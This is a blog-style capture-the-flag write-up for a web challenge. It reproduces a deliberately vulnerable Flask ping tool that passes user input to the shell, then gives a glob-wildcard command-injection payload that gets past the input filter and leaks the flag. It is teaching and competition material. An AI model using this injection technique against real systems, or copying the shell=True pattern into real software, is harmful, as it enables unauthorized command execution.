@@ -1,0 +1,179 @@
+---
+layout: post
+title:  "Web Challenges"
+date:   2026-06-29 14:22:00 -0400
+author: robo.uzi
+tags: [CTF]
+permalink: /v1t-CTF-2026-web/
+---
+* TOC
+{:toc}
+
+**Title**: Duck Nettool Revenge
+
+**Category**: web
+
+**Description**: Solve on local first because on remote have captcha. On remote it will replace all `v1t{fake_flag}` with real flag. Flag on the source code, sorry for the earlier chall was unintended :< `https://api.v1t.site`
+
+I get challenge files for this one. Contents of `app.py`:
+```python
+"""
+TODO / Deployment fixes
+
+- The challenge is currently not solvable because:
+  - flag.txt has incorrect permissions.
+  - flag.py should print(FLAG) not 'FLAG'.
+
+- Fix the deployment files before expecting a valid solve path.
+
+- The SHA-256 hash of v1t{fake_flag} is not realistically brute-forceable,
+  so the init Bash script also needs to be fixed.
+"""
+import os
+import re
+import subprocess
+from flask import Flask, render_template, request
+
+app = Flask(__name__)
+
+BLOCKED_TOKENS = (
+    "Z29vZGJ5ZSB1aXQgaSdtIGFib3V0IHRvIGdyYWR1YXRl",
+    "aWYgeW91IHNvbHZlIHRoaXMgY2hhbGxlbmdlIGVhc2lseSB0aGVuIGkgdGhpbmsgeW91IHNob3VsZCBwbGF5IHNla2FpIGkgaGF2ZSBubyBjaGFuY2UgOy07",
+    
+)
+ALLOWED_TARGET_RE = re.compile(r"^(?!.* \.)(?!.*\. )[i0-9.;?/ ]+$")
+
+@app.route("/", methods=["GET", "POST"])
+def index():
+    output = ""
+    target = ""
+
+    if request.method == "POST":
+        target = request.form.get("target", "")
+        lowered_target = target.lower()
+
+        if not ALLOWED_TARGET_RE.fullmatch(target):
+            output = "Only host-like characters are allowed"
+            return render_template("index.html", output=output, target=target)
+
+        if any(token in lowered_target for token in BLOCKED_TOKENS):
+            output = "Blocked by filter"
+            return render_template("index.html", output=output, target=target)
+
+        try:
+            command = f"ping -c 1 {target}"
+            output = subprocess.check_output(
+                command,
+                shell=True,
+                stderr=subprocess.STDOUT,
+                timeout=5,
+                text=True,
+                env={"PATH": "/bin:/usr/bin"},
+            )
+        except subprocess.CalledProcessError as exc:
+            output = exc.output
+        except subprocess.TimeoutExpired:
+            output = "Command timed out"
+
+    return render_template("index.html", output=output, target=target)
+
+
+if __name__ == "__main__":
+    host = os.getenv("FLASK_HOST", "0.0.0.0")
+    port = int(os.getenv("FLASK_PORT", "5000"))
+    app.run(host=host, port=port)
+```
+
+I decode the blocked tokens:
+```shell
+echo 'Z29vZGJ5ZSB1aXQgaSdtIGFib3V0IHRvIGdyYWR1YXRl' | base64 -d  
+goodbye uit i'm about to graduate
+
+echo 'aWYgeW91IHNvbHZlIHRoaXMgY2hhbGxlbmdlIGVhc2lseSB0aGVuIGkgdGhpbmsgeW91IHNob3VsZCBwbGF5IHNla2FpIGkgaGF2ZSBubyBjaGFuY2UgOy07' | base64 -d  
+if you solve this challenge easily then i think you should play sekai i have no chance ;-;
+```
+
+They use this regex to block input:
+```python
+ALLOWED_TARGET_RE = re.compile(r"^(?!.* \.)(?!.*\. )[i0-9.;?/ ]+$")
+```
+
+These characters are allowed: `.`, `;`, space, `/`, `?`, and `i`
+
+Contents of `Dockerfile`:
+```shell
+FROM python:3.11-slim
+
+ENV PYTHONDONTWRITEBYTECODE=1
+ENV PYTHONUNBUFFERED=1
+
+RUN apt-get update \
+    && apt-get install -y --no-install-recommends iputils-ping \
+    && rm -rf /var/lib/apt/lists/*
+
+RUN useradd --create-home --shell /usr/sbin/nologin ctf
+
+WORKDIR /app
+
+COPY requirements.txt /app/requirements.txt
+RUN pip install --no-cache-dir -r /app/requirements.txt
+
+COPY app.py /app/app.py
+COPY templates /app/templates
+COPY flag.txt /app/flag.txt
+COPY flag.py /app/flag.py
+
+RUN FLAG_SHA256=$(sha256sum /app/flag.txt | awk '{print $1}') \
+    && printf '#!/bin/sh\necho "%s"\n' "$FLAG_SHA256" > /app/init \
+    && chmod 0555 /app/init
+
+RUN chown ctf:ctf /app/app.py /app/requirements.txt \
+    && chown -R ctf:ctf /app/templates \
+    && chown root:root /app/flag.txt /app/flag.py \
+    && chmod 0000 /app/flag.txt \
+    && chmod 0444 /app/flag.py
+
+RUN set -eux; \
+    mkdir -p /opt/keep-bin; \
+    cp -L /bin/sh /opt/keep-bin/sh; \
+    python3 -c "import os; allow = {'/bin': {'sh', 'ping'}, '/usr/bin': {'sh', 'ping'}, '/usr/local/bin': {'python', 'python3', 'python3.11', 'gunicorn'}}; [os.unlink(os.path.join(base, name)) for base, keep in allow.items() for name in os.listdir(base) if name not in keep and (os.path.isfile(os.path.join(base, name)) or os.path.islink(os.path.join(base, name)))]"; \
+    python3 -c "import shutil; shutil.copy2('/opt/keep-bin/sh', '/bin/sh'); shutil.rmtree('/opt/keep-bin')"
+
+ENV PATH=/usr/local/bin:/bin:/usr/bin
+
+USER ctf
+
+EXPOSE 5000
+
+CMD ["gunicorn", "-b", "0.0.0.0:5000", "app:app"]
+```
+The dockerfile deletes every useful file reading binary I can think of. 
+
+I go to the site at `https://api.v1t.site/`:
+
+![Alt text](/images/v1tctf2026web2.png)
+
+Through testing I can tell that RCE is possible. The environment and permissions are just heavily restricted:
+
+![Alt text](/images/v1tctf2026web3.png)
+
+After a lot of testing I try sending `127.0.0.1; /?i?/?? /???/???.?? /???/??????`:
+
+![Alt text](/images/v1tctf2026web1.png)
+
+This outputs the flag! The command it ran is:
+```shell
+ping -c 1 127.0.0.1 ; /bin/sh /app/app.py /app/app.py
+```
+
+`127.0.0.1; /?i?/?? /???/???.??` also works and is more clean.
+
+On the server the deployment script replaced every occurrence of `v1t{fake_flag}` in every source file, including inside `app.py`s [docstring](https://peps.python.org/pep-0257/). 
+
+When `sh` tries to execute `app.py` as a shell script, it can't parse python but it tries anyways. The triple quoted string `"""..."""` is parsed by `sh` as:
+- `""`: empty string
+- `"`: opens a new multi line double quoted string spanning all the docstring content until the next `"`
+- `sh` attempts to execute the entire docstring as a command, outputting it in the `not found` error message.
+Then `sh` hits the real python code and spits out `import: not found` for every `import` line.
+
+`v1t{br0_th15_15_duck}`
